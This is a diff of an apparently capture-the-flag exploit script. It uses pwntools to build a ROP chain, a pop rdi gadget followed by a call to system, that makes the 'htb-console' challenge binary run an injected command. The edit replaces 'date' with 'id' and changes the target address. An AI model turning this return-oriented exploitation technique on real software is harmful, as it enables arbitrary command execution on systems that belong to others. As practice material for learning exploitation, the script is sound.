@@ -4,7 +4,7 @@ context(os='linux', arch='amd64')
 
 executable = '/home/kali/Downloads/htb-console'
 padding_length = 24
-command = 'date'
+command = 'id'
 
 #################################################
 # Create ROP Chain
@@ -15,7 +15,7 @@ elf = context.binary = ELF(executable)
 rop = ROP(elf)
 
 rop.raw(p64((rop.find_gadget(['pop rdi', 'ret']))[0]))
-rop.raw(p64(0x402107))
+rop.raw(p64(0x4040b0))
 rop.call(elf.symbols["system"])
 
 #####################################################
@@ -33,7 +33,7 @@ payload = b"".join(payload)
 
 io = elf.process()
 
-log.info('add /bin/sh to memory')
+log.info('add command to memory')
 io.sendlineafter('>>', 'hof')
 io.sendlineafter('name: ', command)
 
